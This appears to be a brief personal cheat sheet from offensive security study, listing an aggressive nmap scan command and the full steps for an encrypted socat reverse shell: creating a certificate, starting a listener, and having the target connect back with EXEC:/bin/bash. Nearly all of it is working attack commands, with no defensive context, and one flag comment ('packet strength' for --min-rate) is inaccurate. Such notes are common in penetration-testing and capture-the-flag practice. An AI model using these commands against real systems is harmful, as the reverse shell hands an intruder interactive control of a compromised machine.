# SUMMARY OF SCRIPTS AND USER CASES

## NMAP 
```
sudo nmap -sS -sV -sC -T4 --min-rate 8888 $TARGET -vv
# -sS: stealth
# -sC: scripting
# -sV: service detection
# -T4: aggresiveness
# --min-rate: packet strength 
```


## SOCAT ENCRYPTED SHELLS
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt 
cat shell.crt shell.key > shell.pem


# TO START THE ENCRYPTED LISTENER
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# TO CONNECT TO THE LISTENER
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```
